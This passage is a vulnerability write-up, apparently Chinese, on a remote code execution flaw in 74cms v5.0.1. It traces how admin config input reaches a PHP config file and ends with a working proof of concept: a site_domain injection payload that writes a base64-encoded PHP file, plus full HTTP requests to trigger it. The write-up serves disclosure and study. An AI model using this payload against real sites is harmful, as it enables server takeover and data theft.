&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!is_file($config_file) &amp;&amp; $config_file = HOME_CONFIG_PATH . &#39;config.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_writable($config_file)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config = require $config_file;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config = multimerge($config, $new_config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($config[&#39;SESSION_OPTIONS&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;SESSION_OPTIONS&#39;][&#39;path&#39;] = SESSION_PATH;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unlink(RUNTIME_FILE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">multimerge($config, $new_config) in /Application/Common/Common/function.php Line 938: no restricted</span></p><p class="cs3A447A38"><span class="cs9FB05234">function multimerge($a, $b) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (is_array($b) &amp;&amp; count($b)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($b as $k =&gt; $v) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($v) &amp;&amp; count($v)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a[$k] = in_array($k, array(&#39;SESSION_OPTIONS&#39;)) ? multimerge($a[$k], $v) : $v;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a[$k] = $v;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a = $b;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $a;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.&#39;url.php&#39; -&gt; /Application/Common/Conf/url.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">defined(&#39;COMMON_PATH&#39;) &nbsp;or define(&#39;COMMON_PATH&#39;, &nbsp;&nbsp;&nbsp;APP_PATH.&#39;Common/&#39;); // </span><span class="cs7FFD2630">应用公共目录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">defined(&#39;CONF_PATH&#39;) &nbsp;&nbsp;&nbsp;or define(&#39;CONF_PATH&#39;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COMMON_PATH.&#39;Conf/&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;APP_PATH&#39;,&#39;./Application/&#39;);</span></p><p class="cs40DD2BC9"><span class="cs8926E06">var_export(): Quote string with slashes&amp;Convert special characters to HTML entities -&gt; stripslashes(): un-quotes a quoted string -&gt; Convert special characters to HTML entities -&gt; write file</span></p><p class="cs3A447A38"><span class="cs9FB05234">file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;,LOCK_</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/Application/Home/Conf/url.php: The code after &quot;return array(...);&quot; does not work, so payload is site_domain=&#39;, {your php code},&#39;</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">return array (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;URL_MODEL&#39; =&gt; 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;URL_HTML_SUFFIX&#39; =&gt; &#39;.html&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;URL_PATHINFO_DEPR&#39; =&gt; &#39;/&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;URL_ROUTER_ON&#39; =&gt; true,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;URL_ROUTE_RULES&#39; =&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;array (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;/^jobfair\/(?!admin)(\w+)$/&#39; =&gt; &#39;jobfair/index/:1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;/^mall\/(?!admin)(\w+)$/&#39; =&gt; &#39;mall/index/:1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;QSCMS_VERSION&#39; =&gt; &#39;5.0.1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;QSCMS_RELEASE&#39; =&gt; &#39;2019-03-19 00:00:00&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;SESSION_OPTIONS&#39; =&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;array (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;domain&#39; =&gt; &#39;.0.1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;0 =&gt; 18,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;1 =&gt; &#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;path&#39; =&gt; &#39;D:\***\***\***\WWW\74cms\data\session&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&#39;COOKIE_DOMAIN&#39; =&gt; &#39;.0.1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;0 =&gt; 18,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;1 =&gt; &#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">);</span></p><h3 class="cs868C439D">
			<a name="复现poc"><span class="csD6CA00D2">复现</span><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">-&gt; PD9waHAgcGhwaW5mbygpOz8+</span></p><p class="cs40DD2BC9"><span class="cs8926E06">site_domain=&#39;, file_put_contents(&#39;403.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8+&#39;)),&#39;</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/json, text/javascript, */*; q=0.01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 465</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=&#39;%2C+file_put_contents(&#39;403.php&#39;%2Cbase64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8%2B&#39;))%2C&#39;&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /74cms/Application/Common/Conf/url.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功截图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v5.0.1%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81_files/image1.png" width="560" height="205" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="四参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</span></p></body>
</html>
